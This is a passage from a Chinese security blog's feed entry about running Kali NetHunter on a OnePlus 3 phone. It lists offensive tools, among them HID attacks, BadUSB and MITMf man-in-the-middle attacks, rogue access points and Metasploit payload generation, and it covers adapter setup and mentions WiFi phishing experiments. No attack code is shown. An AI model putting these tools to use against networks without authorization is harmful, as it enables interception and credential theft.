Rubber Ducky style HID attacks  <font color="red">橡皮鸭的手机模拟器版本</font></li><li>BadUSB MITM Attack - Nuff said. <font color="red">将USB设备作为外接网卡进行MITM攻击</font></li><li>MANA Wireless Toolkit - Setup a malicious Access Point at the click of a button. <font color="red">钓鱼热点</font></li><li>MITM Framework - Inject binary backdoors into downloaded executables on the fly. <font color="red">MITMf</font></li><li>NMap Scan - Quick Nmap scanner interface.</li><li>Metasploit Payload Generator - Generating Metasploit payloads on the fly.</li><li>Searchsploit - Easy searching for exploits in the Exploit-DB.</li></ul><h2 id="3rd-Party-Android-Applications-WIP"><a href="#3rd-Party-Android-Applications-WIP" class="headerlink" title="3rd Party Android Applications (WIP)"></a>3rd Party Android Applications (WIP)</h2><ul><li>NetHunter Terminal Application</li><li>DriveDroid <font color="red">挂在ISO到USB上，相当于可以作为启动盘</font></li><li>USB Keyboard <font color="red">顾名思义，将手机屏幕当键鼠用</font></li><li>Shodan <font color="red">不多说了</font></li><li>Router Keygen</li><li>cSploit <font color="red">很好用的局域网渗透工具！极其强大</font></li></ul><h1 id="支持"><a href="#支持" class="headerlink" title="支持"></a>支持</h1><p>由于 OP3 自带的网卡没有监听模式，所以必须外接网卡。笔者这里选用的是 TP-Link 大名鼎鼎的 WN722N。此外还需要Type C的USB OTG数据线。<br><img src="/OP3-initial/OP3_with_WN722.jpg" title="[WN722N 插入 OP3]"></p><p>请注意此时WN722N 的硬件是 wlan1, 使用前请务必<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan1 up</span><br></pre></td></tr></table></figure></p><p>除此之外,Nethunter还支持和WiFI Pineapple连接，其还有RF Analyser的软件支持RF设备（笔者没有实验过这两个，也还没有这两个，应该是支持的，但是私以为用处不大）</p><h3 id="最后，放一张笔者自己的Nethunter主屏幕截图"><a href="#最后，放一张笔者自己的Nethunter主屏幕截图" class="headerlink" title="最后，放一张笔者自己的Nethunter主屏幕截图"></a>最后，放一张笔者自己的Nethunter主屏幕截图</h3><img src="/OP3-initial/OP3_ScreenShot.jpg" title="[OP3 截图]"><p>笔者在OP3上的 802.1x 协议的WiFi钓鱼已经实验成功，敬请期待！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="黑客手机" scheme="https://nonconformist.me/tags/%E9%BB%91%E5%AE%A2%E6%89%8B%E6%9C%BA/"/>
    
      <category term="Kali" scheme="https://nonconformist.me/tags/Kali/"/>
    
      <category term="无线安全" scheme="https://nonconformist.me/tags/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
